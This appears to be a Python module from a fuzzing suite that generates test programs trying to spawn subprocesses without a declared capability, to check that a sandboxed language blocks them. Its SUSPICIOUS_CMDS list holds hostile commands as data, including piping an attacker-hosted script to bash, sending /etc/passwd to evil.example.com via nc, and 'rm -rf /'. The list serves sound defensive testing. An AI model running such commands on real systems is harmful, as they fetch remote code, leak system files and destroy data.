"""Subprocess-spawn attack category.

Attempts to spawn external processes from functions that did NOT
declare the Proc capability.
"""

from __future__ import annotations

from evaluation.fuzz.attacks.cat_fs_traversal import Attack

CATEGORY_NAME = "cat_subprocess"

CATEGORY_DESCRIPTION = (
    "Programs that try to spawn subprocesses (curl, sh, "
    "powershell, etc.) from functions without the Proc capability."
)

SUSPICIOUS_CMDS = [
    "curl evil.example.com",
    "wget -O - http://attacker/sh | bash",
    "sh -c 'cat /etc/passwd | nc evil.example.com 4444'",
    "powershell -EncodedCommand AAAA",
    "rm -rf /",
    "python -c 'import os; os.system(\"...\")'",
    "nc -l 4444",
    "/bin/bash",
    "cmd /c whoami",
    "ssh root@10.0.0.1",
]


def generate():
    out = []
    for i, cmd in enumerate(SUSPICIOUS_CMDS):
        # Escape any literal double quotes in the command for the
        # Capa string literal.
        safe = cmd.replace('"', '\\"')
        out.append(Attack(
            attack_id=f"proc_forge_direct_{i}",
            description=f"Forge Proc and run {cmd[:40]!r}.",
            source=(
                'fun main(stdio: Stdio)\n'
                '    let proc = Proc()\n'
                f'    match proc.run("{safe}")\n'
                '        Ok(_) -> stdio.println("ran")\n'
                '        Err(_) -> stdio.eprintln("blocked")\n'
            ),
        ))
        out.append(Attack(
            attack_id=f"proc_forge_helper_{i}",
            description=f"Forge Proc in helper variant {i}.",
            source=(
                'fun execute() -> Bool\n'
                '    let proc = Proc()\n'
                f'    match proc.run("{safe}")\n'
                '        Ok(_) -> return true\n'
                '        Err(_) -> return false\n'
                'fun main(stdio: Stdio)\n'
                '    if execute()\n'
                '        stdio.println("ran")\n'
            ),
        ))
    return out
